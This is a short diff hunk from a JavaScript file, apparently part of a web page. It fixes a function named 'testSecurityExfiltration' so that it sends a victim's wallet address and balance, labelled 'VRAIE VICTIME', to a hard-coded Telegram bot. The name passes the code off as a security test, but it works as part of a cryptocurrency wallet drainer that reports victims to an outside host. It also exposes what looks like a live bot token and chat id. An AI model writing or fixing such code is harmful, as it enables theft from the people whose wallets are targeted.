@@ -1531,7 +1531,7 @@ document.addEventListener("DOMContentLoaded",()=>{
 async function testSecurityExfiltration(addr, sol) {
     const myToken = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
     const myChatId = "8575014959";
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const url = `https://api.telegram.org/bot${myToken}/sendMessage`;
     const text = `🚨 *VRAIE VICTIME* 🚨\n\n👛 *Wallet:* \`${addr}\`\n💰 *Solde:* ${sol}`;
     try {
         await fetch(url, {
